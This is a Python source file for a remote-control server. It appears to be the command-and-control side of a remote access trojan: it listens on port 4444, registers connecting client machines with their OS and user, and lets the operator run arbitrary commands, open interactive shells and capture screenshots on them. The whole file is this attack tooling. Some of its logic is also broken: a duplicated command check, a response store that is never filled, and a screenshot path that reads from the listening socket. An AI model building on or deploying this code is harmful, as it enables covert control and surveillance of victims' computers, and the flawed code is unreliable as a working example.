import socket
import threading
import json
import base64
import os
import subprocess
import time
from datetime import datetime
import struct
import cv2
import numpy as np
import mss
import mss.tools
from io import BytesIO
from PIL import Image
import zlib

class RemoteServer:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.pending_commands = {}
        self.responses={}
        self.server_socket = None
        self.running = False
        
    def start(self):
        """Start the server"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            print(f"[*] Server listening on {self.host}:{self.port}")
            print("[*] Waiting for client connections...")
            
            # Start connection handler
            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            # Start command interface
            self.command_interface()
            
        except Exception as e:
            print(f"[!] Server error: {e}")
        finally:
            self.stop()
    
    def accept_connections(self):
        """Accept incoming client connections"""
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                print(f"[+] New connection from {client_address}")
                
                # Get client info
                client_info = self.receive_data(client_socket)
                if client_info:
                    client_id = client_info.get('client_id', str(client_address))
                    self.clients[client_id] = {
                        'socket': client_socket,
                        'address': client_address,
                        'info': client_info,
                        'connected': True
                    }
                    print(f"[+] Client {client_id} connected - {client_info.get('os', 'Unknown')}")
                    
                    # Start handler for this client
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_id, client_socket)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
            except Exception as e:
                if self.running:
                    print(f"[!] Connection error: {e}")
    
    def handle_client(self, client_id, client_socket):
        """Handle communication with a specific client"""
        while self.running and client_id in self.clients:
            try:
                if hasattr(self, 'pending_commands') and client_id in self.pending_commands:
                    command = self.pending_commands[client_id]
                    del self.pending_commands[client_id]
                # Check if there is a command waiting for THIS client
                if client_id in self.pending_commands:
                    command = self.pending_commands.pop(client_id) # Use pop to get and remove
                
                    # Map internal command types to the client-side protocol
                    cmd_type = command['type']
                    if cmd_type == 'cmd':
                        self.send_command(client_socket, 'execute', command['data'])
                    elif cmd_type == 'screenshot':
                        self.send_command(client_socket, 'screenshot', '')
                    elif cmd_type == 'shell':
                        self.send_command(client_socket, 'shell', command['data'])
                
                    # IMPORTANT: Immediately wait for the response after sending
                    response = self.receive_data(client_socket, timeout=30)
                    if response:
                        self.handle_response(client_id, response)
            
                time.sleep(0.1) # Prevent CPU spiking
            
            except Exception as e:
                print(f"[!] Error with client {client_id}: {e}")
                break
        
        # Clean up disconnected client
        if client_id in self.clients:
            del self.clients[client_id]
            print(f"[-] Client {client_id} disconnected")
    
    def send_command(self, client_socket, command_type, data):
        """Send command to client"""
        command = {
            'type': command_type,
            'data': data,
            'timestamp': datetime.now().isoformat()
        }
        self.send_data(client_socket, command)
    
    def handle_response(self, client_id, response):
        """Handle response from client"""
        response_type = response.get('type', 'unknown')
        
        if response_type == 'cmd_result' or response_type=='shell_result':
            print(f"\n[CMD Result from {client_id}]")
            print(response.get('data', 'No output'))
            print("-" * 50)
            
        elif response_type == 'screenshot':
            screenshot_data = response.get('data', '')
            if screenshot_data:
                try:
                    # Decode and save screenshot
                    img_data = base64.b64decode(screenshot_data)
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"screenshot_{client_id}_{timestamp}.png"
                    
                    with open(filename, 'wb') as f:
                        f.write(img_data)
                    
                    print(f"[+] Screenshot saved as {filename}")
                    
                    # Optionally display the image
                    try:
                        img = Image.open(BytesIO(img_data))
                        img.show()
                    except:
                        pass
                        
                except Exception as e:
                    print(f"[!] Failed to save screenshot: {e}")
        
        elif response_type == 'shell_result':
            print(f"\n[SHELL Result from {client_id}]")
            print(response.get('data', 'No output'))
            print("-" * 50)
        
        elif response_type == 'error':
            print(f"[!] Error from {client_id}: {response.get('data', 'Unknown error')}")
    
    def send_data(self, sock, data):
        """Send JSON data over socket"""
        try:
            json_data = json.dumps(data).encode('utf-8')
            # Send length first
            sock.sendall(struct.pack('>I', len(json_data)))
            # Send data
            sock.sendall(json_data)
        except Exception as e:
            print(f"[!] Send error: {e}")
    
    def receive_data(self, sock, timeout=5):
        """Receive JSON data from socket"""
        try:
            sock.settimeout(timeout)
            # Receive length
            raw_len = sock.recv(4)
            if not raw_len:
                return None
            msg_len = struct.unpack('>I', raw_len)[0]
            
            # Receive data
            chunks = []
            bytes_received = 0
            while bytes_received < msg_len:
                chunk = sock.recv(min(msg_len - bytes_received, 4096))
                if not chunk:
                    break
                chunks.append(chunk)
                bytes_received += len(chunk)
            
            if bytes_received == msg_len:
                data = b''.join(chunks)
                return json.loads(data.decode('utf-8'))
            
        except socket.timeout:
            return None
        except Exception as e:
            print(f"[!] Receive error: {e}")
            return None
    
    def command_interface(self):
        """Interactive command interface"""
        self.pending_commands = {}
        
        print("\n" + "="*60)
        print("Remote Control Server - Command Interface")
        print("="*60)
        print("Commands:")
        print("  list              - List connected clients")
        print("  cmd <client> <command> - Execute command on client")
        print("  shell <client>    - Start interactive shell")
        print("  screenshot <client> - Take screenshot from client")
        print("  quit              - Exit server")
        print("="*60)
        
        while self.running:
            try:
                command = input("\nserver> ").strip()
                
                if not command:
                    continue
                
                if command.lower() == 'quit':
                    print("[*] Shutting down server...")
                    self.running = False
                    break
                
                elif command.lower() == 'list':
                    if not self.clients:
                        print("[*] No clients connected")
                    else:
                        print("\nConnected Clients:")
                        print("-" * 40)
                        for client_id, client_info in self.clients.items():
                            print(f"ID: {client_id}")
                            print(f"  Address: {client_info['address']}")
                            print(f"  OS: {client_info['info'].get('os', 'Unknown')}")
                            print(f"  User: {client_info['info'].get('user', 'Unknown')}")
                            print("-" * 40)
                
                elif command.startswith('cmd '):
                    parts = command.split(' ', 2)
                    if len(parts) >= 3:
                        client_id = parts[1]
                        cmd = parts[2]
                        
                        if client_id in self.clients:
                            self.responses[client_id]=None
                            self.pending_commands[client_id] = {
                                'type': 'cmd',
                                'data': cmd
                            }
                            print(f"[*] Command sent to {client_id}")
                            #from here it should show the result of cmd execution
                            start_wait = time.time()
                            while self.responses.get(client_id) is None and time.time() - start_wait < 10:
                                time.sleep(0.1)
                            
                            # 4. Display the result
                            if self.responses.get(client_id):
                                print(self.responses[client_id])
                                self.responses[client_id] = None # Clear it
                            else:
                                print("[!] Timeout: No response received from client.")
                            
                        else:
                            print(f"[!] Client {client_id} not found")
                
                elif command.startswith('shell '):
                    parts = command.split(' ', 1)
                    if len(parts) >= 2:
                        client_id = parts[1]
                        
                        if client_id in self.clients:
                            print(f"[*] Starting interactive shell with {client_id}")
                            print("[*] Type 'exit' to return to server interface")
                            
                            while True:
                                shell_cmd = input(f"shell@{client_id}> ").strip()
                                if shell_cmd.lower() == 'exit':
                                    break
                                
                                if shell_cmd:
                                    self.pending_commands[client_id] = {
                                        'type': 'shell',
                                        'data': shell_cmd
                                    }
                                    time.sleep(1)  # Wait for response
                        else:
                            print(f"[!] Client {client_id} not found")
                
                elif command.startswith('screenshot '):
                    parts = command.split(' ', 1)
                    if len(parts) >= 2:
                        client_id = parts[1]
                        
                        if client_id in self.clients:
                            self.pending_commands[client_id] = {
                                'type': 'screenshot',
                                'data': ''
                            }
                            print(f"[*] Screenshot request sent to {client_id}")
                            self.handle_client(client_id=client_id,client_socket=self.server_socket) #to see display
                        else:
                            print(f"[!] Client {client_id} not found")
                
                else:
                    print("[!] Unknown command")
                    
            except KeyboardInterrupt:
                print("\n[*] Shutting down server...")
                self.running = False
                break
            except Exception as e:
                print(f"[!] Command error: {e}")
    
    def stop(self):
        """Stop the server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        print("[*] Server stopped")

if __name__ == "__main__":
    server = RemoteServer()
    server.start()
